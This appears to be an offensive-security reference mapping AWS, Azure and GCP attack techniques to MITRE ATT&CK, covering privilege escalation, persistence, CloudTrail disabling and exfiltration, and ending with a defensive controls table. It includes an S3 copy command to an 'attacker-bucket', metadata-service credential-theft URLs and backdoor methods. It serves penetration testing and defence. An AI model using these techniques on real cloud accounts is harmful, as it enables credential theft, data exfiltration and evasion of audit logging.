# Cloud Attack Reference

> Comprehensive cloud attack techniques for AWS, Azure, and GCP — aligned to MITRE ATT&CK for Cloud.
> For educational and authorized security assessment purposes only.

---

## 1. Cloud Attack Overview

### Shared Responsibility Model Recap

Cloud providers secure the **infrastructure** (hardware, hypervisor, physical facilities). Customers are responsible for securing **what they run on it** — identity, data, application configuration, network controls, and access management. Attackers exploit the customer-managed layer, not the provider's core infrastructure.

### Why Cloud Is Targeted

| Factor | Detail |
|---|---|
| Sprawl | Hundreds of accounts, regions, services — large unmonitored attack surface |
| Misconfiguration | Default-permissive settings, public buckets, open security groups |
| Excessive permissions | Broad IAM policies, `*` actions, unused high-priv roles left attached |
| Credentials in code | Access keys, service account files, SAS tokens committed to repos or baked into images |
| Ephemeral identity | Short-lived tokens make logging and attribution harder |

### Key Attack Principles

- **Identity > Network in cloud** — perimeter firewalls matter less; a stolen credential grants access from anywhere.
- **Prefer credentials over exploits** — cloud environments are rich with leaked keys, SSRF-accessible metadata, and over-permissioned roles. Credential abuse is lower risk and higher yield than CVE exploitation.
- **LOLC — Living Off the Land Cloud** — use the cloud provider's own APIs and native services (AWS CLI, Azure PowerShell, gcloud) to blend with legitimate administrative traffic and avoid endpoint-based detection.

---

## 2. AWS Attack Techniques

### Initial Access

| Technique | Description | ATT&CK ID | Tools |
|---|---|---|---|
| Exposed access keys | Keys committed to GitHub, stored in S3, or set as env vars in CI/CD pipelines | T1552.001 | truffleHog, gitleaks, git-secrets |
| SSRF to EC2 metadata | SSRF vulnerability used to query `http://169.254.169.254/latest/meta-data/iam/security-credentials/` for temporary credentials | T1552.005 | manual, curl |
| Phishing for federated creds | Credential phishing targeting SSO / SAML / OIDC federated identities for AWS console access | T1566 | GoPhish, evilginx2 |
| Publicly exposed S3 buckets | Unauthenticated read/list access to S3 buckets containing data or credentials | T1530 | awscli, bucket_finder, S3Scanner |
| Lambda environment variable secrets | Secrets stored in Lambda env vars exposed via over-permissive `lambda:GetFunctionConfiguration` | T1552.005 | Pacu, awscli |

### IAM Privilege Escalation

| Technique | Required Permission | Escalation Path | Tool |
|---|---|---|---|
| PassRole + RunInstances | `iam:PassRole`, `ec2:RunInstances` | Launch EC2 with high-priv role in user-data; curl IMDS to retrieve session credentials | Pacu, manual |
| CreatePolicyVersion | `iam:CreatePolicyVersion` | Add `AdministratorAccess`-equivalent statement to an existing managed policy | Pacu (`iam__privesc_scan`) |
| AttachUserPolicy / AttachRolePolicy | `iam:AttachUserPolicy` or `iam:AttachRolePolicy` | Attach `AdministratorAccess` managed policy directly to own user or role | Pacu, awscli |
| CreateAccessKey | `iam:CreateAccessKey` | Generate a new long-term access key for another (higher-privilege) IAM user | awscli |
| SetDefaultPolicyVersion | `iam:SetDefaultPolicyVersion` | Roll back a managed policy to a previous version that allows broader actions | Pacu, awscli |
| GetPasswordData | `ec2:GetPasswordData` | Retrieve encrypted Windows administrator password for an EC2 instance | awscli |
| AssumeRole cross-account | `sts:AssumeRole` | Assume a role in another account via a permissive trust policy | awscli, Pacu |
| UpdateFunctionCode + Invoke | `lambda:UpdateFunctionCode`, `lambda:InvokeFunction` | Replace Lambda code to exfil the function's execution role credentials | awscli, Pacu |

**Key tools:** [Pacu](https://github.com/RhinoSecurityLabs/pacu) · [Cloudsplaining](https://github.com/salesforce/cloudsplaining) · [Rhino Security Labs PrivEsc blog](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

### Persistence

| Technique | Description |
|---|---|
| New IAM user with console access | Create a hidden IAM user with a password and optionally MFA for console backdoor access |
| New access key for existing high-priv user | Add a second long-term access key to an existing administrator account |
| Lambda backdoor | Deploy or modify a Lambda triggered by CloudTrail events or scheduled — maintains persistent code execution |
| EC2 user-data modification | Modify an instance's user-data to execute attacker code on next stop/start cycle |
| Cross-account role trust modification | Add attacker-controlled account as a trusted principal in an existing role's trust policy |

### Defense Evasion

| Technique | Description |
|---|---|
| Disable CloudTrail logging | `cloudtrail:StopLogging` silences API logging for the targeted trail |
| Delete CloudTrail trail | `cloudtrail:DeleteTrail` permanently removes the trail and its log delivery |
| Create new IAM role for actions | Operate from a freshly created role with no prior baseline, bypassing behavioral anomaly detection |
| AssumeRole chaining | Chain multiple `sts:AssumeRole` calls across accounts to obscure originating identity in logs |

### Data Exfiltration

| Technique | Command / Method |
|---|---|
| S3 bulk copy | `aws s3 cp s3://victim-bucket/ s3://attacker-bucket/ --recursive` |
| EBS snapshot export | Share snapshot with attacker account; copy to attacker region; mount volume |
| RDS snapshot share + restore | `modify-db-snapshot-attribute` to share with attacker account, then restore to attacker-controlled instance |
| Lambda HTTP exfil | Lambda function POSTs environment variables / secrets to attacker-controlled endpoint |

---

## 3. Azure / Entra ID Attack Techniques

### Initial Access

| Technique | Description | ATT&CK ID | Tools |
|---|---|---|---|
| AiTM phishing for M365 credentials | Adversary-in-the-Middle proxy captures session cookies, bypassing MFA | T1566 | evilginx2, Modlishka |
| OAuth consent phishing | Malicious app requests OAuth permissions; user consents; attacker gains delegated access to mailbox/files | T1528 | GraphRunner, custom app |
| Credential stuffing against Entra ID | Large-scale password spraying against Azure AD login endpoints | T1110.004 | MSOLSpray, Spray365 |
| Exposed storage account keys / SAS tokens | Keys or Shared Access Signature tokens found in code, config, or public blobs | T1552 | truffleHog, gitleaks |
| Service principal secret in code | Client secret or certificate for a service principal committed to source control | T1552 | gitleaks, Defender for Cloud |

### Privilege Escalation

| Technique | Description | Tool |
|---|---|---|
| Subscription Owner — self-assign Owner | Any user with Owner role on a subscription can grant themselves or others Owner on any resource | AzureHound, az cli |
| Contributor — Automation RunAs account | Deploy an Azure Automation Account with RunAs (service principal); extract cert; authenticate as that SP | ROADtools, AADInternals |
| Global Admin — all subscriptions | Global Admin in Entra ID can elevate to User Access Administrator on all Azure subscriptions via portal setting | AADInternals |
| Privileged Role Administrator — Global Admin | Assign self the Global Administrator role in Entra ID PIM or directly | GraphRunner, AADInternals |
| User Administrator — reset Global Admin password | Reset the password of a Global Admin account (if not protected by Conditional Access) | AADInternals |
| App Registration owner — add credentials | As owner of an App Registration, add a new client secret or certificate; authenticate as the app | ROADtools, az cli |
| MS Graph RoleManagement consent | App or delegated token with `RoleManagement.ReadWrite.Directory` can assign any directory role | GraphRunner |

**Key tools:** [AzureHound](https://github.com/BloodHoundAD/AzureHound) · [ROADtools](https://github.com/dirkjanm/ROADtools) · [AADInternals](https://github.com/Gerenios/AADInternals) · [GraphRunner](https://github.com/dafthack/GraphRunner)

### Azure-Specific Techniques

| Technique | Description |
|---|---|
| Managed Identity abuse via IMDS | From a compromised Azure VM or App Service, query `http://169.254.169.254/metadata/identity/oauth2/token` to retrieve a bearer token for the assigned managed identity |
| Azure Key Vault access via VM identity | If a VM's managed identity has Key Vault access policy, retrieve secrets/certificates without any stored credential |
| Azure DevOps pipeline poisoning | Inject malicious steps into a pipeline YAML; steal service connection credentials or managed identity tokens at build time |
| Automation Account RunAs cert extraction | Export the RunAs certificate from an Automation Account (requires Contributor); use it to authenticate as the associated service principal |

---

## 4. GCP Attack Techniques

### Initial Access

| Technique | Description | ATT&CK ID | Tools |
|---|---|---|---|
| Service account key file exposure | JSON key files committed to repos, stored in GCS buckets, or embedded in container images | T1552.001 | gitleaks, truffleHog |
| SSRF to GCP metadata server | SSRF to `http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google` header to retrieve service account tokens | T1552.005 | manual, curl |
| Workload Identity Federation misconfiguration | Overly broad attribute mapping allows external identities to impersonate high-privilege service accounts | T1078.004 | manual, gcloud |

### Privilege Escalation

| Technique | Required Permission | Escalation Path | Tool |
|---|---|---|---|
| serviceAccounts.actAs on high-priv SA | `iam.serviceAccounts.actAs` | Attach a high-privilege service account to a new Compute instance; query IMDS to get its token | gcloud, Pacu (GCP modules) |
| Custom role iam.roles.update | `iam.roles.update` on own custom role | Add permissions (e.g., `iam.serviceAccounts.actAs`, `resourcemanager.projects.setIamPolicy`) to attacker-controlled custom role | gcloud |
| Service Account Token Creator | `iam.serviceAccounts.getAccessToken` (Token Creator role) | Call `generateAccessToken` to impersonate any service account in the project | gcloud, custom script |

---

## 5. Key Cloud Attack Tools

| Tool | Platform | License | Purpose |
|---|---|---|---|
| [Pacu](https://github.com/RhinoSecurityLabs/pacu) | AWS | Open Source | Module-based AWS exploitation framework covering enumeration, privilege escalation, persistence, and exfiltration |
| [CloudMapper](https://github.com/duo-labs/cloudmapper) | AWS | Open Source | Network topology visualization and attack surface mapping for AWS environments |
| [Prowler](https://github.com/prowler-cloud/prowler) | AWS | Open Source | AWS security assessment, hardening checks, and CIS benchmark compliance |
| [ScoutSuite](https://github.com/nccgroup/ScoutSuite) | Multi-cloud | Open Source | Cloud Security Posture Management (CSPM) assessment across AWS, Azure, and GCP |
| [Cloudsplaining](https://github.com/salesforce/cloudsplaining) | AWS | Open Source | Analyzes IAM policies to identify privilege escalation paths and excessive permissions |
| [AzureHound](https://github.com/BloodHoundAD/AzureHound) | Azure | Open Source | BloodHound data collector for Azure and Entra ID — maps attack paths to high-value targets |
| [ROADtools](https://github.com/dirkjanm/ROADtools) | Azure | Open Source | Azure AD enumeration, token manipulation, and offline analysis of Entra ID objects |
| [AADInternals](https://github.com/Gerenios/AADInternals) | Azure | Open Source | PowerShell toolkit for Azure AD / Office 365 attacks including token extraction and backdooring |
| [GraphRunner](https://github.com/dafthack/GraphRunner) | Azure / O365 | Open Source | Microsoft Graph API post-exploitation — mailbox access, app consent, credential abuse |
| [gitleaks](https://github.com/gitleaks/gitleaks) | All clouds | Open Source | Fast secrets detection in git repositories and CI/CD pipelines |
| [truffleHog](https://github.com/trufflesecurity/trufflehog) | All clouds | Open Source | Deep secrets scanning with entropy analysis and verified detection across source code and history |
| [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat) | AWS | Open Source | Rhino Security Labs' intentionally vulnerable AWS environment for hands-on attack practice |
| [flaws.cloud](http://flaws.cloud) | AWS | Web | Level-based AWS vulnerability challenge covering common misconfigurations |
| [GCPGOAT](https://github.com/ine-labs/GCPGoat) | GCP | Open Source | INE Labs' intentionally vulnerable GCP environment for hands-on attack practice |

---

## 6. ATT&CK Cloud Technique Reference

| ID | Name | Platform | Key Tools / Notes |
|---|---|---|---|
| T1530 | Data from Cloud Storage Object | AWS, Azure, GCP | awscli (`s3 cp`), azcopy, gsutil — unauthenticated or credential-based bulk exfil from object storage |
| T1552.005 | Unsecured Credentials: Cloud Instance Metadata API | AWS, Azure, GCP | curl to `169.254.169.254` or `metadata.google.internal`; retrieves IAM role / managed identity / SA tokens |
| T1578 | Modify Cloud Compute Infrastructure | AWS, Azure, GCP | Create/modify snapshots, images, or instances to establish persistence or exfil data |
| T1537 | Transfer Data to Cloud Account | AWS, Azure, GCP | Move data to attacker-controlled cloud storage using native sync tools |
| T1136.003 | Create Account: Cloud Account | AWS, Azure, GCP | `iam create-user`, `az ad user create`, `gcloud iam service-accounts create` for persistent backdoor access |
| T1098.001 | Account Manipulation: Additional Cloud Credentials | AWS, Azure, GCP | Add access keys, client secrets, or SSH keys to existing accounts to maintain access |
| T1580 | Cloud Infrastructure Discovery | AWS, Azure, GCP | Enumerate running instances, storage, databases, and network topology via provider APIs |
| T1087.004 | Account Discovery: Cloud Account | AWS, Azure, GCP | `iam list-users`, `az ad user list`, `gcloud iam service-accounts list` — map all identities |
| T1619 | Cloud Storage Object Discovery | AWS, Azure, GCP | Enumerate accessible buckets/containers and their contents; precursor to T1530 exfil |

Full matrix: [attack.mitre.org/matrices/enterprise/cloud/](https://attack.mitre.org/matrices/enterprise/cloud/)

---

## 7. Cloud Security Defensive Quick Reference

| Control | AWS Service | Azure Service | GCP Service |
|---|---|---|---|
| CSPM / Posture Management | Security Hub + Macie | Microsoft Defender for Cloud | Security Command Center |
| Logging and Audit | CloudTrail | Azure Monitor / Microsoft Sentinel | Cloud Audit Logs |
| IAM Analysis | IAM Access Analyzer | Privileged Identity Management (PIM) | IAM Recommender |
| Secret Management | AWS Secrets Manager | Azure Key Vault | Secret Manager |
| Network Controls | Security Groups / NACLs | Network Security Groups (NSG) | VPC Firewall Rules |
| Workload Vulnerability Mgmt | Amazon Inspector | Defender for Servers | Security Command Center |
| Identity Threat Detection | GuardDuty | Entra ID Protection | Anomaly Detection (SCC) |

---

*Reference built for educational and authorized security assessment use. Always obtain written authorization before testing cloud environments.*
